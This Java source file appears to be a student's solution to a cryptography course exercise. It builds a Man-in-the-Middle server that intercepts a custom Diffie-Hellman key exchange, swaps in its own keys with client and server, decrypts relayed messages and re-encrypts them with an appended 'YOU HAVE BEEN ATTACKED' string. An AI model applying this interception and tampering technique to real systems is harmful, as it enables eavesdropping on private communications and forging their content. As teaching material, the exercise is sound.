package crypto.mitm;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.net.ServerSocket;
import java.net.Socket;

import client.exception.ServerDHKeyException;
import client.utils.StringParser;
import crypto.messages.ClientMessageType;
import crypto.messages.ServerMessageType;
import crypto.messages.request.*;
import crypto.messages.response.*;
import crypto.students.DHEx;
import crypto.students.StreamCipher;
import org.apache.log4j.Logger;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

/***
 * This class is an skeleton of a very basic server. It must
 * be extended to offer a Man-in-the-Middle attack.
 * Candidates are prompt to modify it at will. Nevertheless,
 * no external libraries could be used to expand Java capabilities.
 *
 * @author pabloserrano
 */
public class MitMServer {
	// log for debugging purposes...
	private static Logger log = Logger.getLogger(MitMServer.class);

	// class parameters...
	private String ip; // refers to real server
	private int port; // used by MitM and Real server
	private String studentId; // id...

	// networking variables
	private ServerSocket serverSocket;
	private Socket socket;
	private Socket client_socket;
	private DataOutputStream writer_to_client;
	private DataInputStream reader_from_client;
	private DataOutputStream writer_to_server;
	private DataInputStream reader_from_server;

	// server related
	BigInteger generator;
	BigInteger prime;
	BigInteger pkServer_server;
	BigInteger skClient_server;
	BigInteger pkClient_server;
	BigInteger shared_key_server;
	StreamCipher streamCipher_server;

	// client related
	BigInteger pkServer_client;
	BigInteger skServer_client;
	BigInteger pkClient_client;
	BigInteger shared_key_client;
	StreamCipher streamCipher_client;

	// communication protocol variables
	private BigInteger p1;
	private BigInteger p2;

	private JSONParser parser = new JSONParser();

	// message buffer
	private final int BUFFER_SIZE = 8 * 1024; // 8KB is ok...

	// class constructor
	public MitMServer(String ip, int port, String studentId) throws IOException {
		this.ip = ip;
		this.port = port;
		this.studentId = studentId;
		serverSocket = new ServerSocket(4444);
		client_socket = serverSocket.accept();
		reader_from_client = new DataInputStream(client_socket.getInputStream());
		writer_to_client = new DataOutputStream(client_socket.getOutputStream());
		socket = new Socket(ip, port);
		writer_to_server = new DataOutputStream(socket.getOutputStream());
		reader_from_server = new DataInputStream(socket.getInputStream());
	}

	// this method attends just one possible client, other
	// connections will be discarded (server busy...)
	public void start() throws IOException, ParseException, ServerDHKeyException {
		// Start listening for client's messages	
		byte[] buffer_client_hello = read_from_client();
		String helloServer = new String(buffer_client_hello, "UTF-8");
		HelloRequest helloRequest = new HelloRequest();
		helloRequest.fromJSON(StringParser.getUTFString(helloServer));
		transfer_to_server(helloRequest.toJSON().getBytes("UTF-8"));
		byte[] buffer_server_hello = read_from_server();
		String reply_from_server = new String(buffer_server_hello, "UTF-8");
		transfer_to_client(buffer_server_hello);

		// exchange key with client and server
		exchange_with_server_and_client();

		// Specification case
		byte[] server_spec = read_from_server();
		String spec = new String(server_spec, "UTF-8");
		if(spec.contains("SERVER_DHEX_ERROR")) {
			transfer_to_client(server_spec);
			throw new ServerDHKeyException();
		}
		SpecsResponse specsResponse = new SpecsResponse();
		specsResponse.fromJSON(StringParser.getUTFString(spec));

		p1 = specsResponse.getP1();
		p2 = specsResponse.getP2();
		transfer_to_client(server_spec);

		byte[] client_spec = read_from_client();
		SpecsDoneRequest specsDoneRequest = new SpecsDoneRequest();
		specsDoneRequest.fromJSON(StringParser.getUTFString(new String(client_spec, "UTF-8")));
		transfer_to_server(specsDoneRequest.toJSON().getBytes("UTF-8"));

		streamCipher_server = new StreamCipher(shared_key_server, prime, p1, p2);
		streamCipher_client = new StreamCipher(shared_key_client, prime, p1, p2);

		// send message from server to client
		byte[] msg = read_from_server();
		String server_msg = new String(msg, "UTF-8");
		while(server_msg.contains(ServerMessageType.SERVER_NEXT_LENGTH.toString())) {
			transfer_to_client(msg);
			long messageLength = 0L;
			NextLengthResponse response = new NextLengthResponse();
			response.fromJSON(StringParser.getUTFString(server_msg));

			messageLength = response.getLength();

			byte[] client_next_length_recv = read_from_client();
			MessageLengthReceivedRequest messageLengthReceivedRequest = new MessageLengthReceivedRequest();
			messageLengthReceivedRequest.fromJSON(StringParser.getUTFString(new String(client_next_length_recv, "UTF-8")));
			transfer_to_server(messageLengthReceivedRequest.toJSON().getBytes("UTF-8"));

			decrypt_and_encrypt_server_msg(messageLength);

			byte[] client_text_recv = read_from_client();
			TextReceivedRequest textReceivedRequest = new TextReceivedRequest();
			textReceivedRequest.fromJSON(StringParser.getUTFString(new String(client_text_recv, "UTF-8")));
			transfer_to_server(textReceivedRequest.toJSON().getBytes("UTF-8"));

			msg = read_from_server();
			server_msg = new String(msg, "UTF-8");
		}
		if(server_msg.contains(ServerMessageType.SERVER_TEXT_DONE.toString())) {
			transfer_to_client(msg);
		}

		// send message from client to server
		byte[] c_msg = read_from_client();
		String client_msg = new String(c_msg, "UTF-8");
		while(client_msg.contains(ServerMessageType.SERVER_NEXT_LENGTH.toString())) {
			transfer_to_client(c_msg);
			long messageLength = 0L;
			NextLengthResponse response = new NextLengthResponse();
			response.fromJSON(StringParser.getUTFString(client_msg));

			messageLength = response.getLength();

			byte[] server_next_length_recv = read_from_server();
			transfer_to_client(server_next_length_recv);

			decrypt_and_encrypt_client_msg(messageLength);

			byte[] server_text_recv = read_from_client();
			transfer_to_client(server_text_recv);

			c_msg = read_from_client();
			client_msg = new String(c_msg, "UTF-8");
		}
		if(client_msg.contains(ClientMessageType.CLIENT_TEXT_DONE.toString())) {
			TextDoneRequest textDoneRequest = new TextDoneRequest();
			textDoneRequest.fromJSON(StringParser.getUTFString(client_msg));
			transfer_to_server(textDoneRequest.toJSON().getBytes("UTF-8"));
		}
		byte[] server_comm_end = read_from_server();
		transfer_to_client(server_comm_end);

		byte[] client_comm_end = read_from_client();
		CommDoneRequest commDoneRequest = new CommDoneRequest();
		commDoneRequest.fromJSON(StringParser.getUTFString(new String(client_comm_end, "UTF-8")));
		transfer_to_server(commDoneRequest.toJSON().getBytes("UTF-8"));

		log.info("MITM Tasks completed successfully. Terminating cleanly...");
		if (socket != null && !socket.isClosed())
			socket.close();
		if (serverSocket != null && !serverSocket.isClosed())
			serverSocket.close();
	}

	private void exchange_with_server_and_client() throws IOException, ParseException {
		byte[] buffer_client_start = read_from_client();
		String reply = new String(buffer_client_start, "UTF-8");
		DHExStartRequest dhExStartRequest = new DHExStartRequest();
		dhExStartRequest.fromJSON(StringParser.getUTFString(reply));
		transfer_to_server(dhExStartRequest.toJSON().getBytes("UTF-8"));

		byte[] server_dhex = read_from_server();
		String server_parameters = new String(server_dhex, "UTF-8");
		DHExStartResponse response = new DHExStartResponse();
		response.fromJSON(StringParser.getUTFString(server_parameters));

		generator = response.getGenerator();
		prime = response.getPrime();
		pkServer_server = response.getPkServer();
		skClient_server = response.getSkClient();

		// after that the man_in_the_middle got the public parameters from server, it calculates the client public key'
		BigInteger tempKey = DHEx.createPrivateKey(2048);
		BigInteger[] pair = DHEx.createDHPair(generator, prime, tempKey);
		skClient_server = pair[0];
		pkClient_server = pair[1];

		// create new public parameters for the real client and send
		skServer_client = DHEx.createPrivateKey(2048);
		BigInteger[] pair2 = DHEx.createDHPair(generator, prime, skServer_client);
		pkServer_client = pair2[1];
		DHExStartResponse response_to_client = new DHExStartResponse(generator, prime, pkServer_client, (int)response.getCounter());
		transfer_to_client(response_to_client.toJSON().getBytes("UTF-8"));

		byte[] client_dhex = read_from_client();
		String client_parameter = new String(client_dhex, "UTF-8");
		DHExRequest dhExRequest = new DHExRequest();
		dhExRequest.fromJSON((StringParser.getUTFString(client_parameter)));

		pkClient_client = dhExRequest.getPkClient();

		// send fake client public key to server
		DHExRequest request_to_server = new DHExRequest(pkClient_server, (int)dhExRequest.getCounter());
		transfer_to_server(request_to_server.toJSON().getBytes("UTF-8"));

		byte[] server_dhex_done = read_from_server();
		transfer_to_client(server_dhex_done);

		//calculate shared key for client
		byte[] client_dhex_done = read_from_client();
		StringBuffer client_shared_key = new StringBuffer().append(new String(client_dhex_done,"UTF-8"));
		System.out.println(client_shared_key);
		int i = client_shared_key.lastIndexOf(":");
		client_shared_key.insert(i + 1, '"');
		int j = client_shared_key.lastIndexOf("}");
		client_shared_key.insert(j, '"');
		String c = client_shared_key.toString();
		System.out.println(client_shared_key);
		DHExDoneRequest request_done = new DHExDoneRequest();
		request_done.fromJSON(StringParser.getUTFString(c));
		shared_key_client = DHEx.getDHSharedKey(pkClient_client, skServer_client, prime);
		log.debug("The shared key with client is: [" + shared_key_client + "]");

		//calculate shared key for server and send
		shared_key_server = DHEx.getDHSharedKey(pkServer_server, skClient_server, prime);
		log.debug("The shared key with server is: [" + shared_key_server + "]");
		DHExDoneRequest request_done_client = new DHExDoneRequest(shared_key_server, (int)request_done.getCounter());
		transfer_to_server(request_done_client.toJSON().getBytes("UTF-8"));

	}
	public void transfer_to_client(byte[] buff) throws IOException {
		log.debug("MITM Message to transfer to client: [" + new String(buff, "UTF-8") + "]");
		writer_to_client.write(buff);
		writer_to_client.flush();
	}

	public void transfer_to_server(byte[] buff) throws IOException {
		log.debug("MITM Message to transfer to server: [" + new String(buff, "UTF-8") + "]");
		writer_to_server.write(buff);
		writer_to_server.flush();
	}

	public byte[] read_from_client() throws IOException {
		byte[] buff = new byte[BUFFER_SIZE];
		reader_from_client.read(buff);
		return buff;
	}

	public byte[] read_from_server() throws IOException {
		byte[] buff = new byte[BUFFER_SIZE];
		reader_from_server.read(buff);
		return buff;
	}

	public void decrypt_and_encrypt_server_msg(long messageLength) throws IOException, ParseException {
		TextResponse response = new TextResponse();
		byte[] buffer = new byte[(int)messageLength];
		reader_from_server.read(buffer);
		String reply = new String(buffer, "UTF-8");
		log.debug("Message received from server: [" + reply + "]");
		response.fromJSON(StringParser.getUTFString(reply));
		String plaintext = streamCipher_server.decrypt(response.getBody());
		log.debug("plaintext of server: [" + plaintext + "]");
		plaintext += "HAHA! YOU HAVE BEEN ATTACKED!";
		String ciphertext = streamCipher_client.encrypt(plaintext);
		log.debug("ciphertext to client: [" + ciphertext + "]");
		response.setBody(ciphertext);
		transfer_to_client(response.toJSON().getBytes("UTF-8"));
	}

	public void decrypt_and_encrypt_client_msg(long length) throws IOException, ParseException {
		TextResponse response = new TextResponse();
		byte[] buffer = new byte[(int) length];
		reader_from_client.read(buffer);
		String reply = new String(buffer, "UTF-8");
		log.debug("Message received from client: [" + reply + "]");
		response.fromJSON(StringParser.getUTFString(reply));
		String plaintext = streamCipher_client.decrypt(response.getBody());
		log.debug("plaintext of client: [" + plaintext + "]");
		plaintext += "HAHA! YOU HAVE BEEN ATTACKED!";
		String ciphertext = streamCipher_server.encrypt(plaintext);
		log.debug("ciphertext to server: [" + ciphertext + "]");
		response.setBody(ciphertext);
		transfer_to_server(response.toJSON().getBytes("UTF-8"));
	}
}
